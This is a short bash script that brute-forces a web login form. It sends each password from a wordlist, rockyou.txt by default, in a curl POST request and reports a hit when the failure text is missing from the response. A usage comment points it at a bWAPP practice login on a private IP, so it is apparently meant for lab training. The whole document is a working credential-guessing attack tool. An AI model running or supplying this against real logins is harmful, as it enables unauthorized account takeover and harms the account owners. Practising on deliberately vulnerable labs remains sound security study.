#!/bin/bash
CMD=$(curl $1 -X POST -d $2 -L -s)
echo -e "\n$1 : URL \n"
echo -e "$2 : Data to post\n"
echo -e "$3 : Pattern to match\n"
echo -e "$4 : Wordlist"
echo -e "Warning ! use the word 'test' in the data to post like : password=test\n"

if [ -z $4 ];then
	WORDLIST="/usr/share/wordlists/rockyou.txt"
else
	WORDLIST=$4
fi

for pwd in $(cat $WORDLIST);
do
	DATA=$(echo $2 | sed "s/test/$pwd/g")
	CMD=$(curl $1 -X POST -d $DATA -L -s)
	if echo "$CMD" | grep -q "$3" ;then
		echo "Mauvais password ! $pwd"
	else
		echo "Password found ! : $pwd"
		exit 0
	fi
done

#Sample of usage
# ./bruteforce.sh http://192.168.12.240/bWAPP/login.php "security_level=0&form=submit&login=bee&password=test" Invalid rockyou.txt
# Don't forget the test word in password= args